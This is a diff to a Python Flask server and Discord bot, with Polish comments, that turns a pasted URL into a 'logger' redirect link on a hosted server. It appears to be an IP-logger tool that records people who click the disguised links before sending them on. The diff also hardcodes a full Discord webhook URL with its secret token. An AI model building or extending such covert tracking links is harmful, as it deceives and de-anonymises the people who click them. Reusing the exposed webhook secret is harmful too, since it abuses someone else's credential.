@@ -1,5 +1,6 @@
 import os
 import asyncio
+import threading
 import random
 import string
 from datetime import datetime
@@ -7,7 +8,6 @@ from flask import Flask, request, redirect, jsonify
 import requests
 import discord
 from discord import app_commands
-from werkzeug.serving import make_server
 
 # ========================================================
 # CONFIGURATION
@@ -15,7 +15,6 @@ from werkzeug.serving import make_server
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1508140013651624067/nMxvkUrDRE_0GyeZ15dPV_1DIJ04VGUlKlSQCgG6C61v0118dLK81ojbtovwab88Xcal'
 BOT_TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
 SERVER_URL = 'https://server-mc.onrender.com'
-PORT = int(os.environ.get("PORT", 5000))
 
 # ========================================================
 # FLASK SERVER (Backend)
@@ -100,6 +99,10 @@ def redirect_to_url(link_id):
 
     return redirect(original_url)
 
+@app.route('/')
+def home():
+    return "Server is running perfectly!", 200
+
 # ========================================================
 # DISCORD BOT
 # ========================================================
@@ -122,38 +125,27 @@ bot_client = MyClient()
 @app_commands.describe(url="Wklej oryginalny adres URL")
 async def link(interaction: discord.Interaction, url: str):
     await interaction.response.defer(ephemeral=True)
-    local_url = f"http://127.0.0.1:{PORT}/generate"
-    try:
-        response = requests.post(local_url, json={"originalUrl": url}, timeout=5)
-        if response.status_code == 200:
-            logger_url = response.json().get("loggerUrl")
-            await interaction.followup.send(content=f"🟢 **Link wygenerowany:**\n`{logger_url}`", ephemeral=True)
-        else:
-            await interaction.followup.send(content="🔴 Serwer Flask zwrócił błąd.", ephemeral=True)
-    except Exception as e:
-        await interaction.followup.send(content=f"🔴 Brak komunikacji z backendem: {e}", ephemeral=True)
+    
+    # Komunikacja wewnętrzna w pamięci aplikacji
+    link_id = generate_random_id()
+    links_database[link_id] = url
+    logger_url = f"{SERVER_URL}/redirect/{link_id}"
+    
+    await interaction.followup.send(content=f"🟢 **Link wygenerowany:**\n`{logger_url}`", ephemeral=True)
 
-# ========================================================
-# ASYNC RUNNER (Jednoczesny start)
-# ========================================================
-async def main():
-    # Uruchamianie serwera Flask asynchronicznie w tle
-    server = make_server('0.0.0.0', PORT, app)
-    print(f"Serwer Flask startuje na porcie {PORT}...")
-    loop = asyncio.get_running_loop()
-    loop.run_in_executor(None, server.serve_forever)
+def run_bot_in_thread():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(bot_client.start(BOT_TOKEN))
 
-    # Uruchamianie bota Discorda (główny proces async)
-    if BOT_TOKEN:
-        print("Uruchamianie bota Discord...")
-        try:
-            await bot_client.start(BOT_TOKEN)
-        except Exception as e:
-            print(f"Błąd krytyczny bota: {e}")
-    else:
-        print("🚨 BRAK TOKENU BOTA! Serwer działa, ale bot nie wstanie.")
-        while True:
-            await asyncio.sleep(3600)
+# Automatyczny start bota przy imporcie pliku przez Gunicorn
+if BOT_TOKEN:
+    print("Inicjalizacja wątku bota...")
+    threading.Thread(target=run_bot_in_thread, daemon=True).start()
+else:
+    print("🚨 BRAK TOKENU BOTA W ZMIENNYCH ŚRODOWISKOWYCH!")
 
+# Uruchomienie lokalne (tylko do testów, Gunicorn tego nie używa)
 if __name__ == '__main__':
-    asyncio.run(main())
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
